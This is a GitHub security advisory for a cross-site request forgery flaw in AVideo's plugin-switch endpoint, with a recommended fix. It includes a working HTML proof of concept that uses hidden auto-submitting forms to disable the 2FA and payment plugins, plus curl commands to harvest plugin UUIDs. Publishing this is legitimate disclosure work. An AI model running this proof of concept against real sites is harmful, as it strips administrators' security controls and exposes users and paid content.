# [M] AVideo: CSRF on Plugin Enable/Disable Endpoint Allows Disabling Security Plugins

## Summary
Severity: Medium
Advisory: GHSA-hqxf-mhfw-rc44
CVE: CVE-2026-34613
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-hqxf-mhfw-rc44
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The AVideo endpoint `objects/pluginSwitch.json.php` allows administrators to enable or disable any installed plugin. The endpoint checks for an active admin session but does not validate a CSRF token. Additionally, the `plugins` database table is explicitly listed in `ignoreTableSecurityCheck()`, which means the ORM-level Referer/Origin domain validation in `ObjectYPT::save()` is also bypassed. Combined with `SameSite=None` on session cookies, an attacker can disable critical security plugins (such as LoginControl for 2FA, subscription enforcement, or access control plugins) by luring an admin to a malicious page.

Plugin UUIDs are not secret values. They are hardcoded in the frontend JavaScript source and are consistent across installations, making it trivial for an attacker to target specific plugins.

## Details

The `objects/pluginSwitch.json.php` endpoint checks admin status but performs no CSRF validation:

```php
// objects/pluginSwitch.json.php
if (!User::isAdmin()) {
    die('{"error": "Must be admin"}');
}

$obj = new Plugin(0);
$obj->loadFromUUID($_POST['uuid']);
$obj->setStatus($_POST['status']);
$obj->save();
```

The `plugins` table is explicitly excluded from the ORM security check at `objects/Object.php:529`:

```php
// objects/Object.php:529
public static function ignoreTableSecurityCheck() {
    return array(
        'plugins',
        // ... other tables
    );
}
```

This means the `save()` call does not trigger the Referer/Origin domain validation that normally acts as a secondary CSRF defense for other ORM operations.

Plugin UUIDs are hardcoded in each plugin's `getUUID()` method and are consistent across all AVideo installations. Examples:

| Plugin | UUID |
|--------|------|
| Gallery | `a06505bf-3570-4b1f-977a-fd0e5cab205d` |
| LoginControl | `LoginControl-5ee8405eaaa16` |
| Live | `e06b161c-cbd0-4c1d-a484-71018efa2f35` |
| YPTWallet | `2faf2eeb-88ac-48e1-a098-37e76ae3e9f3` |

These are also exposed in frontend JavaScript:

```javascript
// design_first_page.php:99
var galleryUUID = 'a06505bf-3570-4b1f-977a-fd0e5cab205d';
```

## Proof of Concept

Host the following HTML page on an attacker-controlled domain. This example disables the LoginControl plugin (which provides 2FA and login security enforcement):

```html
<!DOCTYPE html>
<html>
<head><title>AVI-031 PoC - Disable Security Plugin</title></head>
<body>
<h1>Loading content...</h1>

<!-- Disable LoginControl (2FA / brute force protection) -->
<iframe name="f1" style="display:none"></iframe>
<form id="disable1" method="POST" target="f1"
      action="https://your-avideo-instance.com/objects/pluginSwitch.json.php">
  <input type="hidden" name="uuid" value="LoginControl-5ee8405eaaa16" />
  <input type="hidden" name="status" value="inactive" />
</form>

<!-- Disable YPTWallet (subscription/payment enforcement) -->
<iframe name="f2" style="display:none"></iframe>
<form id="disable2" method="POST" target="f2"
      action="https://your-avideo-instance.com/objects/pluginSwitch.json.php">
  <input type="hidden" name="uuid" value="2faf2eeb-88ac-48e1-a098-37e76ae3e9f3" />
  <input type="hidden" name="status" value="inactive" />
</form>

<script>
  document.getElementById('disable1').submit();
  document.getElementById('disable2').submit();
</script>
</body>
</html>
```

**To find plugin UUIDs on a target instance:**

```bash
# UUIDs are exposed in the frontend source
curl -s "https://your-avideo-instance.com/" | grep -oP '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
```

**Verification with curl:**

```bash
# Disable a plugin using an admin session
curl -b "PHPSESSID=ADMIN_SESSION_COOKIE" \
  -X POST "https://your-avideo-instance.com/objects/pluginSwitch.json.php" \
  -d "uuid=a06505bf-3570-4b1f-977a-fd0e5cab205d&status=inactive"

# Verify the plugin is now inactive
curl -b "PHPSESSID=ADMIN_SESSION_COOKIE" \
  "https://your-avideo-instance.com/admin/index.php" | grep -A2 "Gallery"
```

## Impact

An attacker can silently disable any AVideo plugin by luring an authenticated admin to a malicious web page. This has significant security implications because AVideo relies on plugins for critical security functions:

- **LoginControl**: Provides two-factor authentication and brute force protection. Disabling it removes 2FA for all users and allows unlimited login attempts.
- **Subscription/PayPal/Stripe plugins**: Enforce payment requirements for premium content. Disabling them grants free access to paid videos.
- **Access control plugins**: Restrict content visibility. Disabling them exposes private or restricted videos.

The attack is silent (no visible indication to the admin), the plugin UUIDs are public constants, and the `SameSite=None` cookie policy ensures cross-origin delivery of the admin session.

- **CWE-352**: Cross-Site Request Forgery

## Recommended Fix

Add CSRF token validation at `objects/pluginSwitch.json.php:11`, after the admin check:

```php
// objects/pluginSwitch.json.php:11
if (!isGlobalTokenValid()) {
    forbiddenPage('Invalid CSRF token');
}
```

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-hqxf-mhfw-rc44
- https://nvd.nist.gov/vuln/detail/CVE-2026-34613
- https://github.com/WWBN/AVideo/commit/7ddfe4ec270d720e11f5dc28db73dfcd2cf9192a
- https://github.com/WWBN/AVideo/commit/da375103d59118d1c1b1801ac7fce3cd426f8736
- https://github.com/WWBN/AVideo
